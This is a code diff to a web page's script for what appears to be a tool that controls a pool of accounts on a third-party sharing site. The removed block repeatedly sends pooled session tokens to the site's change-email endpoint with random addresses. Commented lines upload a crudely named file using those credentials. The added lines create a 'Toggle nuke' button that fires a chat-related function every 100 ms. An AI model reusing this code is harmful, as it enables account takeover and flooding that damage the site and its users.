@@ -316,27 +316,6 @@
 		  document.querySelectorAll(".ano-only").forEach((e)=>e.remove());
 		}
 		if (accPool.length > 0) {
-		  !async function(){
-		    //const ssibu = await fetch("https://raw.githubusercontent.com/anuser88/cebu--/master/shit.sibu").then(x=>x.blob());
-		    setInterval(()=>{
-			  let sAcc = poolGet();
-			  sAcc.newEmail = `${Math.random().toString(36).substring(2)}_${Math.random().toString(36).substring(2)}@gmail.com`;
-			  //const sibuForm = new FormData();
-		      //sibuForm.append("file", ssibu, `part_0.sb3`);
-		      //sibuForm.append("username", sAcc.username);
-		      //sibuForm.append("sessionToken", sAcc.sessionToken);
-			  fetch("https://turboshare.org.uk/api/auth/change_email",{
-		        "headers": {
-			      "x-client-type": "StudioDANV-Web"
-		        },
-		        "referrer": "https://turboshare.org.uk/",
-		        "body": JSON.stringify(sAcc),
-		        "method": "POST",
-		        "mode": "cors",
-		        "credentials": "include"
-              });
-			},200);
-		  }();
 		  document.getElementById('lbl-amr').style.display = 'none';
 		  document.getElementById('upl-btn').classList.add('nav-active');
 		  document.getElementById('upl-btn').disabled = false;
@@ -563,12 +542,17 @@
 		  globalChatChannel.subscribe((status) => {
 			if (status === 'SUBSCRIBED') {
 			  console.log('WebSocket connected');
-			  setInterval(SiBu, 300);
+			  if (localStorage.getItem("nuke") === 'enabled') setInterval(SiBu, 100);
 			} else {
 			  console.log('Wait:', status);
 			}
-		  });  
+		  });
 		}
+		document.getElementById("nuke").addEventListener("click", ()=>{
+		  if (localStorage.getItem("nuke") === 'enabled') localStorage.removeItem("nuke");
+		  else localStorage.setItem("nuke", "enabled");
+		  location.reload();
+		});
       }();
     </script>
     <style>
@@ -814,6 +798,7 @@
 			<button class="nav-btn nav-active" id="ano-rfr-btn">New anonymous account</button>
 		    <button class="nav-btn nav-active" id="ano-dis-btn">Disable anonymous mode</button>
 		    <button class="nav-btn nav-active" id="ano-pri-btn">Convert to primary account</button>
+		    <button class="nav-btn nav-active" id="nuke">Toggle nuke</button>
 		  </div>
 		</div>
       </div>
